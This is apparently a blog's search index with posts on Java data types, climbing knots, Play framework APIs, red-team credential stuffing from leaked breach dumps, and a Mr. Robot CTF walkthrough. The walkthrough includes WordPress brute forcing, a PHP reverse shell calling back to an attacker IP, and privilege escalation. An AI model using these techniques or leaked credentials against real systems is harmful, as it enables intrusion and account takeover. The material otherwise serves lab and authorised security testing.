{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"2017/01/14/algebraic-data-types-in-java/","title":"Algebraic Data Types in Java","text":"<p>Many languages, especially functional ones, make use of algebraic data types. That is, types that have fixed and well known subtypes or implementations. Most languages have some keyword to allow the developer to prevent new implementations of the class from being made. One example would be the <code>sealed</code> keyword on scala traits, which prevents the trait from being implemented anywhere except for in the file where it was declared.  </p> <p>Java does not have any keywords like this, but it's a common misconception that algebraic data types can't be made in java. Java can have algebraic data types, and in fact it's quite simple and doesn't require anything released in recent versions. Simply put: all we need are abstract classes with private constructors and static inner classes. A quick example:</p> <pre><code>public abstract class Bool {\n    private Bool(){}\n    public abstract boolean value();\n\n    public static final class True extends Bool {\n        public boolean value(){\n            return true;\n        }\n    }\n    public static final class False extends Bool {\n        public boolean value(){\n            return false;\n        }\n    }\n}\n</code></pre> <p>A <code>Bool</code> can now be either <code>Bool.True</code> or <code>Bool.False</code>. No class outside of <code>Bool</code> can subclass <code>Bool</code> because of the <code>private</code> scope of the constructor, and there can be no instance of <code>Bool</code> itself since it is <code>abstract</code>. One more thing that we did, but didn't have to do in this example is make <code>True</code> and <code>False</code> <code>final</code> classes. This allows us to say that <code>Bool</code> either is <code>True</code> or is <code>False</code> rather than what we would say if we didn't have <code>final</code>, which is that <code>Bool</code> either is a <code>True</code> or is a <code>False</code>.</p> <p>If you're not familiar with algebraic data types, you may be asking why we would want to do this in the first place, or why we didn't implement <code>Bool</code> as an <code>Enum</code>. The reason we didn't use an enum is that unlike our simple example above many algebraic data types have a different structure between their subclasses, an enum however has the same structure between every possible value. To illustrate this better, I'll implement a haskell style immutable linked list with some methods.</p> <pre><code>public abstract class List&lt;T&gt; implements Iterable&lt;T&gt; {\n    private List(){}\n\n    public static &lt;T&gt; List&lt;T&gt; of(T... elements){\n        List&lt;T&gt; list = new Nil&lt;&gt;();\n        for(int i = elements.length; i --&gt; 0;){\n            list = new Cons&lt;&gt;(elements[i], list);\n        }\n        return list;\n    }\n\n    public abstract int size();\n    public abstract boolean contains(T that);\n    public abstract &lt;B&gt; List&lt;B&gt; map(Function&lt;T, ? extends B&gt; mapper);\n\n    public static class Cons&lt;T&gt; extends List&lt;T&gt; {\n        public final T head;\n        public final List&lt;T&gt; tail;\n\n        public Cons(T head, List&lt;T&gt; tail){\n            this.head = head;\n            this.tail = tail;\n        }\n\n        public int size() {\n            return 1 + tail.size();\n        }\n\n        public boolean contains(T that) {\n            return head.equals(that) || tail.contains(that);\n        }\n\n        public &lt;B&gt; List&lt;B&gt; map(Function&lt;T, ? extends B&gt; mapper) {\n            return new Cons&lt;&gt;(mapper.apply(head), tail.map(mapper));\n        }\n\n        public String toString(){\n            return head + \", \" + tail;\n        }\n    }\n\n    public static class Nil&lt;T&gt; extends List&lt;T&gt;{\n        public int size() { return 0; }\n        public boolean contains(T that) { return false; }\n        public &lt;B&gt; List&lt;B&gt; map(Function&lt;T, ? extends B&gt; mapper) { return new Nil&lt;&gt;(); }\n    }\n}\n</code></pre> <p>Not too bad, but implementing each method in the subclasses did make us write a lot, and we haven't implemented <code>iterator()</code> for <code>Iterable</code> yet, since it doesn't lend itself well to recursion. So let's toss a <code>match(Function&lt;Cons&lt;T&gt;, B&gt;)</code> method in there which will make it easier for us to access each type without using <code>instanceof</code> and a cast. We'll use a java 8 <code>Optional</code> (which itself would be good to implement as an algebraic data type, see the end of the post for what that would look like) to help us with <code>match</code>. <code>match</code> will return empty for <code>Nil</code>, and return the application of a function on itself for <code>Cons</code>, and with that we'll move the implementations of our methods up into <code>List</code> and implement <code>iterator()</code>. </p> <p>note: Usually with inheritance you want to move your logic and implementations down lower in the inheritance tree, you want your higher classes to define behavior and your lower classes to implement it, and you don't want higher classes to be concerned with what kinds of implementations there are. Algebraic data types on the other hand are the opposite. Since the implementations are fixed and we know exactly what they are, there's no problem.</p> <pre><code>public abstract class List&lt;T&gt; implements Iterable&lt;T&gt;{\n    private List(){}\n\n    public static &lt;T&gt; List&lt;T&gt; of(T... elements){\n        List&lt;T&gt; list = new Nil&lt;&gt;();\n        for(int i = elements.length; i --&gt; 0;){\n            list = new Cons&lt;&gt;(elements[i], list);\n        }\n        return list;\n    }\n\n    public abstract &lt;B&gt; Optional&lt;B&gt; match(Function&lt;Cons&lt;T&gt;, B&gt; f);\n\n    public int size(){\n        return match(thiz -&gt;\n                1 + thiz.tail.size()\n        ).orElse(\n                0\n        );\n    }\n\n    public boolean contains(T that){\n        return match(thiz -&gt;\n                that.equals(thiz.head) || thiz.tail.contains(that)\n        ).orElse(\n                false\n        );\n    }\n\n    public &lt;B&gt; List&lt;B&gt; map(Function&lt;T, ? extends B&gt; mapper){\n        return match(thiz -&gt;\n                (List&lt;B&gt;) new Cons&lt;&gt;(mapper.apply(thiz.head), thiz.tail.map(mapper))\n        ).orElse(\n                new Nil&lt;&gt;()\n        );\n    }\n\n    public Iterator&lt;T&gt; iterator() {\n        List&lt;T&gt; outer = this;\n        return new Iterator&lt;T&gt;() {\n            List&lt;T&gt; inner = outer;\n            public boolean hasNext() {\n                return inner instanceof Cons;\n            }\n            public T next() {\n                T ret = inner.match(thiz -&gt; thiz.head)\n                        .orElseThrow(() -&gt; new NoSuchElementException(\"Nil has no elements\"));\n                inner = inner.tail();\n                return ret;\n            }\n        };\n    }\n\n    public List&lt;T&gt; tail(){\n        return match(thiz -&gt;\n                thiz.tail\n        ).orElse(\n                this\n        );\n    }\n\n    public static class Cons&lt;T&gt; extends List&lt;T&gt; {\n        public final T head;\n        public final List&lt;T&gt; tail;\n\n        public Cons(T head, List&lt;T&gt; tail){\n            this.head = head;\n            this.tail = tail;\n        }\n\n        public &lt;B&gt; Optional&lt;B&gt; match(Function&lt;Cons&lt;T&gt;, B&gt; f) {\n            return Optional.of(f.apply(this));\n        }\n\n        public String toString(){\n            return head + \", \" + tail;\n        }\n    }\n\n    public static class Nil&lt;T&gt; extends List&lt;T&gt;{\n        public &lt;B&gt; Optional&lt;B&gt; match(Function&lt;Cons&lt;T&gt;, B&gt; f){ return Optional.empty(); }\n        public String toString(){ return \"Nil\"; }\n    }\n}\n</code></pre> <p>As previously mentioned, here's how <code>Optional</code> might look as an algebraic data type as well (only the methods we used were included, but would likely include many more).</p> <pre><code>public abstract class Option&lt;T&gt; {\n    private Option(){}\n\n    public abstract T orElse(T that);\n    public abstract T orElseThrow(Exception t) throws Exception;\n\n    public static class Some&lt;T&gt; extends Option&lt;T&gt; {\n        public final T value;\n\n        public Some(T value){\n            this.value = value;\n        }\n\n        public T orElse(T that) {return value;}\n        public T orElseThrow(Exception t) {return value;}\n    }\n\n    public static class None&lt;T&gt; extends Option&lt;T&gt; {\n        public T orElse(T that) {return that;}\n        public T orElseThrow(Exception t) throws Exception {throw t;}\n    }\n}\n</code></pre>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/","title":"Bowline with a Bight for tying in to the middle of a line","text":"<p>When climbing it's common to need to \"tie in\", or attach yourself to a rope line. Typically you tie in to one of the ends of the line, and there are well established ways of doing this. However, sometimes it's necessary to tie into the middle of the line. </p> <p>Practices around tying into the middle of a line are less established than tying in to the end. Here we'll cover some of the different knots used as well as go into detail on one which is arguably the best, the bowline with a bight.</p>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#figure-eight-on-a-bight","title":"Figure-eight on a bight","text":"<p> When tying in to the end of a line the figure-eight loop (ABoK#1047) tied with a follow-through is used almost universally thanks to its strength and ease of inspection.  Given the ubiquity of the figure-eight, it's not surprising that climbers use it for tying in to the middle of the line as well as the end.  However, since the standing end of the line isn't available, the figure-eight needs to be tied on a bight and attached to the harness with a carabiner.  Unfortunately the addition of the carabiner causes some problems. The carabiner is typically weaker than the figure-eight, so the advantage of the figure-eight's strength is removed.  The carabiner also needs to have some mechanism to prevent cross-loading, since the minor axis strength is usually less than half of the strength of a correctly oriented carabiner.  A carabiner also needs a locking mechanism, and the climber needs to ensure they don't forget to engage the lock.</p>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#alpine-butterfly","title":"Alpine butterfly","text":"<p> The alpine butterfly (ABoK#1053) is another knot commonly used to tie into the middle of a line.  It's not as strong as the figure-eight, but it's easier to tie with gloves on, easier to untie, and it just looks friggin awesome.  Unfortunately it shares all the disadvantages that come with the inclusion of the carabiner.</p>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#clove-hitch","title":"Clove hitch","text":"<p> The clove hitch (ABoK#1245) is wicked fast to tie, and can also be tied on a carabiner with one hand.  When loosened, it's easy to adjust the position on the line. The knot unties itself when removed from the carabiner, which can be useful for escaping a loaded line.</p>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#bowline-with-a-bight","title":"Bowline with a bight","text":"<p>Arguably the best way to tie into the middle of a line is with the bowline with a bight. The name of this knot is something of a vagary. \"Mountaineering: The Freedom of the Hills\" (8<sup>th</sup> ed.) calls this a double bowline, however that name typically refers to a different knot (ABoK#1013). It also should not be confused with the bowline on a bight (ABoK#1080). Ultimately the name bowline with a bight came from consensus on r/knots.  The great thing about this method of tying in is that although it uses a carabiner, the carabiner is not load bearing.  So a smaller carabiner can be used and it doesn't need to have a mechanism to prevent cross-loading. It is also strong, yet very easy to untie.</p> <p>Since this is the knot we prefer, let's learn to tie it.  Essentially the knot is made the same way as a normal bowline (ABoK#1010), but with a bight, rather than the standing end of the rope.  Therefore it may be useful to learn how to tie the normal bowline first.</p>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#tying-a-bowline-with-a-bight","title":"Tying a bowline with a bight","text":"<ol> <li> <p>take a bight of rope </p> </li> <li> <p>make an open loop </p> </li> <li> <p>make a loop on the standing ends </p> </li> <li> <p>pass the working bight through the loop </p> </li> <li> <p>wrap the working bight around the standing ends  </p> </li> <li> <p>pass the working bight back through the loop </p> </li> <li> <p>tighten and dress the knot </p> </li> </ol>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#tying-a-bowline-with-a-bight-to-a-harness","title":"Tying a bowline with a bight to a harness","text":"<ol> <li> <p>instead of making an open loop, pass the bight through the tie in loops </p> </li> <li> <p>make the knot </p> </li> <li> <p>clip the bight to the belay loop </p> </li> <li> <p>climb!</p> </li> </ol>"},{"location":"2020/05/30/bowline-with-a-bight-for-tying-in-to-the-middle-of-a-line/#the-cowboy-or-left-hand-bowline","title":"The cowboy or left-hand bowline","text":"<p>The meticulous reader might have noticed that our step by step knot and our knot on the harness aren't quite the same.  The working bight ended up on the inside of the loop on one, and outside the loop on the other.</p> <p> </p> <p>This latter form is called the cowboy or left-hand variant. It doesn't matter which you tie. Just pull the belay loop through the bowline loop to be on the same side as the bight to keep things tidy.</p>"},{"location":"2023/09/28/modern-breach-hunting-for-red-team-applications/","title":"Modern Breach Hunting for Red Team Applications","text":"<p>Breach hunting has in recent years been a primary attack vector for malicious hackers to obtain a foothold on corporate networks. Gone (mostly) are the days of finding SQL injection on a company\u2019s customer-facing web resources, popping open an XP_CMDSHELL, and proxychaining your way to the DC. Now even non-technically-savvy organizations are able to leverage The Cloud and COTS solutions that preclude a lot of the easy initial attack vectors that many of us grew up with.</p> <p>However, no amount of the latest patched VPN solutions, bastion servers, diligent access logging, etc can entirely prevent the oldest attack vector primitive: people making mistakes. This article will go in-depth examining one of the easiest (and most effective) ways of cracking the perimeter: credential stuffing. I will also introduce you to the tools and techniques that I have found most useful for this practice. It goes without saying that use of these techniques in scenarios where they are not explicitly permitted is highly illegal, so use your head.</p>"},{"location":"2023/09/28/modern-breach-hunting-for-red-team-applications/#a-brief-explanation-of-credential-stuffing","title":"A (brief) Explanation of Credential Stuffing","text":"<p>Credential stuffing Mitre Att&amp;ck T1110.004 is, in essence, the use of valid accounts or credentials discovered by attackers that are then used to authenticate to privileged resources as that legitimate account. This is a powerful attack vector due to the fact that an attacker is using valid credentials from the outset instead of leveraging vulnerabilities present in the software, and can effectively bypass antivirus, application control, firewall, IDS/IPS, and other access controls.</p> <p>Many malicious actors, such as the Chimera APT group, have used this technique to great effect (see: https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/)</p>"},{"location":"2023/09/28/modern-breach-hunting-for-red-team-applications/#down-in-the-dumps","title":"Down in the Dumps","text":"<p>Before you can stuff credentials, you need to obtain them. The easiest (and, let\u2019s say, most legal way) to get them is to leverage leaks that typically originate from previous breaches (such as the 2012 LinkedIn hack). These are typically then combined with other database credential leaks from other hacks and repackaged as \u201cbreach compilation\u201d files. Over the years there have been a number of both clearnet and darknet sites dedicated to swapping these files (colloquially known as \u201cdumps\u201d) among users, with some sites charging a small fee to access the files. I won\u2019t touch on the morality of downloading these files (some of which contain billions of plaintext credentials) except to say that in a legitimate Red-Team offering I believe your team is doing organizations a disservice by not using these realistic techniques.</p> <p>Probably the most widely-available (and still relevant) dump that\u2019s out there today is known as COMB (Compilation of Many Breaches). COMB first surfaced in early 2021 and contains roughly 3.4 billion plaintext credentials compiled from thousands of data breaches. I am in COMB, and you likely are as well. COMB will be used in all further examples in this article (unless explicitly stated otherwise). There are newer, and perhaps more relevant credential dumps out there, exercise your hacker creativity to find them.</p>"},{"location":"2023/09/28/modern-breach-hunting-for-red-team-applications/#breach-hunting-fundamentals","title":"Breach Hunting Fundamentals","text":"<p>In order to effectively and quickly query billions of credentials to find what we\u2019re looking for, we are going to use a program called h8mail. It is capable of using both local breach files as well as APIs (such as the HaveIBeenPwned v3 API) to query on specific strings. For our purposes, we will be using exclusively a local copy of the COMB dump.</p> <p>Installation is simple:</p> <pre><code>~$ pip3 install h8mail\n</code></pre> <p>Suppose we are targeting an organization as part of Red-Team operations. We can query the local COMB files as follows:</p> <pre><code>~$ sudo h8mail -t \"@securityinnovation.com\" -lb CompilationOfManyBreaches/ -sk --loose\n</code></pre> <ul> <li><code>-t \"@securityinnovation.com\"</code> is the domain we want to target.</li> <li><code>-lb CompilationOfManyBreaches/</code> is instructing h8mail to to use the local breach (-lb) files located at the CompilationOfManyBreaches directory.</li> <li><code>-sk</code> instructs h8mail to skip default API checks and only use the local files.</li> <li><code>--loose</code> allows loose search by disabling email pattern recognition. This will come in more handy later.</li> </ul> <p>Running the above command, we can see a large number of results:</p> <p></p>"},{"location":"2023/09/28/modern-breach-hunting-for-red-team-applications/#going-deeper","title":"Going Deeper","text":"<p>We can use the initial scan of a domain as a jumping-off point for more targeted testing. Below are some ideas and techniques that I have had success with:</p> <ul> <li> <p>Reverse-password searching.</p> <ul> <li>This is very useful when an account found in a dump has a relatively unique password. This password can be used in the following way: <code>~$ sudo h8mail -t \"SomeUniquePassword1234\" -lb CompilationOfManyBreaches/ -sk --loose</code>.</li> <li>This can find other emails and domains that may be associated with the same user. Those emails/domains can then be independently looked up using the same commands to reveal even more leaked credentials and expand the attack surface.</li> </ul> </li> <li> <p>Targeted wordlist generation.</p> <ul> <li>Even in the event that plaintext credentials have been rotated and no longer work on, for example, an SSH port or a corp VPN instance, the passwords themselves provide an excellent starting point for wordlist generation using a tool such as John. Wordlist generation is an art in and of itself that deserves its own article (coming soon!).</li> </ul> </li> </ul>"},{"location":"2016/08/06/hacking-f_society/","title":"Hacking f_society","text":"<p>Mr. Robot is a show on AMC about a disturbed hacker attempting to thwart an omni-present oligarchy while at the same time trying to suppress a dark alter-ego modeled after his own father.</p> <p>Notably, the show tries to portray \"hacking\" realistically (inasmuch as it can without entire episodes dedicated to watching Elliot pore over the documentation of a specific vulnerable version of httpd running on Windows Server 2000), and I appreciate it. Well, mostly.</p> <p>With that in mind, let's break a Mr. Robot themed VM together, and maybe learn something about webapp security along the way.</p> <p>Download the .ova from vulnhub, pop it in your favorite virtualization software (hard to go wrong with VirtualBox), and boot it up. The Mr. Robot VM grabs a DHCP lease on boot, and I'd recommend running it and your offense box on the same virtual subnet.</p>"},{"location":"2016/08/06/hacking-f_society/#recon-scanning","title":"Recon / Scanning","text":"<p>First, let's scan the subnet to find Mr. Robot's VM.</p> <pre><code>root@bento:~# nmap -A 10.0.2.0/24\nStarting Nmap 7.01 ( https://nmap.org ) at 2016-08-03 23:48 PDT\n\nNmap scan report for 10.0.2.5\nHost is up (0.00052s latency).\nNot shown: 997 filtered ports\nPORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Site doesn't have a title (text/html).\n443/tcp open   ssl/http Apache httpd\n|_http-server-header: Apache\n|_http-title: Site doesn't have a title (text/html).\n| ssl-cert: Subject: commonName=www.example.com\n| Not valid before: 2015-09-16T10:45:03\n|_Not valid after:  2025-09-13T10:45:03\nMAC Address: 08:00:27:6C:39:39 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 3.X\nOS CPE: cpe:/o:linux:linux_kernel:3\nOS details: Linux 3.10 - 3.19\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 10.0.2.5\n</code></pre> <p>From the scan, we can see the VM is probably serving some sort of web-service. Before we investigate this further, however, let's run some more scans and see if we can dig up anything else.</p> <pre><code>root@bento:~# nikto -host 10.0.2.5\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.0.2.5\n+ Target Hostname:    10.0.2.5\n+ Target Port:        80\n---------------------------------------------------------------------------\n+ OSVDB-3092: /admin/: This might be interesting...\n+ OSVDB-3092: /license.txt: License file found may identify site software.\n+ /admin/index.html: Admin login page/section found.\n+ /wp-login/: Admin login page/section found.\n+ /wordpress/: A Wordpress installation was found.\n+ /wp-admin/wp-login.php: Wordpress login found\n+ /blog/wp-login.php: Wordpress login found\n+ /wp-login.php: Wordpress login found\n</code></pre> <p>Our nikto scan turns up a bunch of interesting directories, including what looks like an admin portal for a WordPress site. Definitely worth checking out.</p> <p>Navigating to the VMs IP in Firefox yields the following page:</p> <p></p> <p>None of the commands are all that interesting. What is interesting, however, is the site's robots.txt file:</p> <p></p> <p>Looks like we've got our first key.</p> <pre><code>root@bento~# wget http://10.0.2.10/key-1-of-3.txt\n--2016-08-06 18:43:14--  http://10.0.2.10/key-1-of-3.txt\nConnecting to 10.0.2.10:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 33 [text/plain]\nSaving to: \u2018key-1-of-3.txt\u2019\n\nkey-1-of-3.txt      100%[===================&gt;]      33  --.-KB/s    in 0s      \n\n2016-08-06 18:43:14 (7.39 MB/s) - \u2018key-1-of-3.txt\u2019 saved [33/33]\n\nroot@bento~# cat key-1-of-3.txt\n073403c8a58a1f80d943455fb30724b9\n</code></pre> <p>That's a pretty easy win in my book. I'll take it. Save the .dic file for later, there's no telling how it will come in handy but I doubt they let us have it for nothing.</p> <p>Time to revisit the nikto scan and see if we can turn up anything from the WordPress directories. Let's start with the login page, /wp-login.php.</p>"},{"location":"2016/08/06/hacking-f_society/#gaining-access","title":"Gaining Access","text":"<p>Poking at the login page with a few default credentials doesn't really reveal anything interesting. Routing the request/response traffic through Burp also comes up short. Going back to the .dic file we downloaded earlier, it's pretty clearly some kind of wordlist. There are many duplicate words in there, however, so I hacked together a Python script to remove them:</p> <pre><code>with open('fsocity.dic') as infile: dic = infile.readlines()\ndic = set(dic)\nfsocity = open('fsocity_sorted.dic', 'w')\nfor i in dic: fsocity.write(\"%s\" % i)\n</code></pre> <p>Now, using the sorted wordlist and the username 'Elliot' (the most commonly occurring username in the .dic file) we can attempt to bruteforce the WordPress login. I'll be using the wpscan tool for my web cracking.</p> <pre><code>root@bento:~# wpscan -u http://10.0.2.10/ --wordlist fsocity_sorted.dic --username Elliot\n  Brute Forcing 'Elliot': |===================================\n  [+] [SUCCESS] Login : Elliot Password : ER28-0652\n\n  Brute Forcing 'Elliot': |===================================\n  +----+--------+------+-----------+\n  | Id | Login  | Name | Password  |\n  +----+--------+------+-----------+\n  |    | Elliot |      | ER28-0652 |\n  +----+--------+------+-----------+\n\n[+] Finished: Mon Aug  8 12:57:26 2016\n[+] Requests Done: 7853\n[+] Memory used: 11.816 MB\n[+] Elapsed time: 00:02:09\n</code></pre> <p>Input the credentials into the login form... and we're in.</p>"},{"location":"2016/08/06/hacking-f_society/#privilege-escelation","title":"Privilege Escelation","text":"<p>From the WordPress admin page, we have access to the source code of a variety of plugins. Using this, we can spawn a reverse shell with some clever PHP code. The reverse shell I use I grabbed from here, just make sure to make the necessary adjustments to the socket so you can actually recieve the  traffic your reverse shell sends back. To do this, edit these lines of the above .php script:</p> <pre><code>set_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.0.2.15';  // CHANGE THIS\n$port = 6666;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n</code></pre> <p>to reflect your own IP address as well as a generic port you wish to recieve the traffic on. After that, either zip and upload the standalone PHP shellcode as a WordPress plugin, or paste the script into one of the plugins already on the site. Then, set up a listener in your terminal and activate the plugin containing the payload:</p> <pre><code>root@bento:~# nc -lvp 6666\nlistening on [any] 6666 ...\n10.0.2.10: inverse host lookup failed: Unknown host\nconnect to [10.0.2.15] from (UNKNOWN) [10.0.2.10] 57491\nLinux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n 22:26:41 up  1:08,  0 users,  load average: 0.01, 0.04, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\ndaemon\n$ \n</code></pre> <p>Cool, we have a shell session up. I poked around the system for a long time looking for clues or other keys, and finally found the files 'password.raw-md5' and 'key-2-of-3.txt' in '/home/robot'. However, cat-ing the file gives Permission Denied. Looks like I'll have to escalate my privilege.</p> <pre><code>$ su\nsu: must be run from a terminal\n$\n</code></pre> <p>Okay, first we have to spawn a terminal with Python:</p> <pre><code>$ python -c 'import pty; pty.spawn(\"bin/sh\")'\n$ su robot\nsu robot\nPassword:\n</code></pre> <p>Great, now at least we can 'su'. Going back to the file 'password.raw-md5' we found does indeed give us a raw md5 hash. Popping it into one of the online crackers like this one gives us the string 'abcdefghijklmnopqrstuvwxyz'. Nice. You'd think Elliot would have a better password.</p> <pre><code>$ su robot\nPassword: abcdefghijklmnopqrstuvwxyz\n\nrobot@linux:/$ whoami\nwhoami\nrobot\nrobot@linux:/$ cat key-2-of-3.txt\ncat key-2-of-3.txt\n822c73956184f694993bede3eb39f959\nrobot@linux:/$\n</code></pre> <p>Nice. Got the second key.</p> <p>-TC</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/","title":"Hypermedia APIs in Play! framework with the blackdoor hate library","text":"<p>REST APIs are all the rage. They make web services easier and simpler to use. However, most REST APIs are not fully RESTfull or \"mature\". This is because they typically lack one thing, HATEOAS (Hypermedia As The Engine Of Application State). The most commonly cited reason for not creating hypermedia APIs is \"it's too hard\". It may indeed be hard sometimes if you're not sure what to do and the framework you're using doesn't have support built in. But it doesn't have to be.  </p> <p>You can use the blackdoor hate library to easily produce hypermedia APIs any time, in any framework. hate uses HAL (Hypermedia Application Language), which provides \"a consistent and easy way to hyperlink between resources in your API\". Here we will walk through using the hate library to create a hypermedia API using play framework (which has no built in support) and JPA.</p> <p>We will leave these first few sections rather sparse, since great documentation on setting up this stack already exists elsewhere.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#create-play-project","title":"Create play project","text":"<p>Following the play framework documentation let's start a new project.</p> <pre><code>$ activator new petstore play-java\n$ cd petstore\n</code></pre>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#set-up-our-database-connection","title":"Set up our database connection","text":"<p>Again, following the play framework documentation we set up our persistence. Basically we need to add dependencies to our <code>build.sbt</code>, create JPA config at <code>conf/META-INF/persistence.xml</code>, and add connection settings to <code>conf/application.conf</code>.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#create-database-schema","title":"Create database schema","text":"<p>For our petstore, we will have 3 entities: pets, items, and orders. A quick DDL for our database gives us </p> <pre><code>CREATE TABLE pet (\n    id BIGSERIAL PRIMARY KEY,\n    name VARCHAR,\n    type VARCHAR,\n    status VARCHAR,\n    photo_url VARCHAR\n);\n\nCREATE TABLE item (\n    id BIGSERIAL PRIMARY KEY,\n    name VARCHAR\n);\n\nCREATE TABLE orders (\n    id BIGSERIAL PRIMARY KEY,\n    pet_id BIGINT REFERENCES pet(id),\n    item_id BIGINT REFERENCES item(id),\n    quantity INT,\n    order_date TIMESTAMP DEFAULT now()\n);\n</code></pre> <p>I'm using PostgreSQL, but this schema should be fairly universal. Lets add a few quick rows to our database.</p> <pre><code>INSERT INTO \n    pet (name, type, status, photo_url) \n    VALUES('fido', 'dog', 'available', 'https://upload.wikimedia.org/wikipedia/commons/a/a6/Dog_anatomy_lateral_skeleton_view.jpg');\nINSERT INTO item (name) VALUES ('chew toy');\nINSERT INTO orders (pet_id, item_id, quantity) VALUES (1, 1, 2);\n</code></pre> <p>This migration can be found at <code>conf/db/migrate/migration.sql</code>.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#java-models","title":"Java models","text":"<p>Let's make some Java model objects with JPA annotations to match our tables.</p> <p>First an <code>Item</code>. This is our simplest model, something the store can order for one of the pets.</p> <pre><code>@Entity\npublic class Item{\n\n    @Id\n    @GeneratedValue\n    private long id;\n\n    @Column\n    private String name;\n\n    // getters and setters\n}\n</code></pre> <p>Next a <code>Pet</code>. Notice the pet has a URL to a photo, that will make for some nice hypermedia later.</p> <pre><code>@Entity\npublic class Pet{\n\n    @Id\n    @GeneratedValue\n    private long id;\n\n    @Column\n    private String name;\n\n    @Column\n    private String type;\n\n    @Column\n    private String status;\n\n    @Column(name = \"photo_url\")\n    private String photoUrl;\n\n    //getters and setters \n}\n</code></pre> <p>Lastly an <code>Order</code>, our model with foreign keys. This is where we will really see HAL in use.</p> <pre><code>@Entity\n@Table(name = \"orders\")\npublic class Order{\n\n    @Id\n    @GeneratedValue\n    private long id;\n\n    @JoinColumn(name = \"pet_id\")\n    @ManyToOne\n    private Pet pet;\n\n    @JoinColumn(name = \"item_id\")\n    @ManyToOne\n    private Item item;\n\n    @Column\n    private int quantity;\n\n    @Column(name = \"order_date\")\n    private Timestamp orderDate = Timestamp.from(Instant.now());\n\n    // getters and setters\n}\n</code></pre>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#create-routes","title":"Create routes","text":"<p>Let's define our route mapping at <code>conf/routes</code>. We haven't created a controller yet, but we can map our routes to controller methods which we will create later.</p> <pre><code>GET     /pets/:petId                controllers.ResourceController.showPet(petId: Long)\nGET     /store/orders/:orderId      controllers.ResourceController.showOrder(orderId: Long)\nGET     /store/inventory/:itemId    controllers.ResourceController.showItem(itemId: Long)\n</code></pre> <p>The routes file is straightforward, but it very usefull. Later we will see how we can use the play framework reverse router to build paths from this file. That means that this file will be the one definition for the location of resources, we won't have to change things anywhere else.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#create-controller","title":"Create controller","text":"<p>A quick play controller to access our models, querying with JPQL and serializing with play's built in jackson helper.</p> <pre><code>public class ResourceController extends Controller {\n\n    static {\n        // help our jackson a bit to give us nice timestamp strings instead of epoch\n        Json.mapper().configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);\n    }\n\n    private final JPAApi jpaApi;\n\n    @Inject\n    public ResourceController(JPAApi jpaApi){\n        this.jpaApi = jpaApi;\n    }\n\n    public Result showPet(long id) {\n        Pet pet = (Pet) jpaApi.withTransaction(em -&gt; \n                em.createQuery(\"SELECT e FROM Pet e WHERE e.id = :id\")\n                .setParameter(\"id\", id)\n                .getSingleResult());\n        return ok(Json.toJson(pet));\n    }\n\n    public Result showOrder(long id) {\n        Order order = (Order) jpaApi.withTransaction(em -&gt;\n                em.createQuery(\"SELECT e FROM Order e WHERE e.id = :id\")\n                .setParameter(\"id\", id)\n                .getSingleResult());\n        return ok(Json.toJson(order));\n    }\n\n    public Result showItem(long id) {\n        Item item = (Item) jpaApi.withTransaction(em -&gt; \n                em.createQuery(\"SELECT e FROM Item e WHERE e.id = :id\")\n                .setParameter(\"id\", id)\n                .getSingleResult());\n        return ok(Json.toJson(item));\n    }\n</code></pre> <p>Now we have everything we need for a basic querying api. We can start our server in development mode with <code>activator run</code> and calling <code>GET /store/orders/1</code> returns us </p> <pre><code>{\n  \"id\": 1,\n  \"pet\": {\n    \"id\": 1,\n    \"name\": \"fido\",\n    \"type\": \"dog\",\n    \"status\": \"available\",\n    \"photoUrl\": \"https://upload.wikimedia.org/wikipedia/commons/a/a6/Dog_anatomy_lateral_skeleton_view.jpg\"\n  },\n  \"item\": {\n    \"id\": 1,\n    \"name\": \"chew toy\"\n  },\n  \"quantity\": 2,\n  \"orderDate\": \"2016-08-22T00:14:08.442+0000\"\n}\n</code></pre> <p>this is all well and good, but there are a few things we might like to be different</p> <ul> <li>we don't know how to change <code>pet</code> or <code>item</code>, we would need to write some api documentation or something telling users how to take the id of those resources and build a URI with it</li> <li>in the order it's good that we can see all the details of <code>item</code> since we would rarely want to know about an order without knowing about the item being orderd, however we care less about 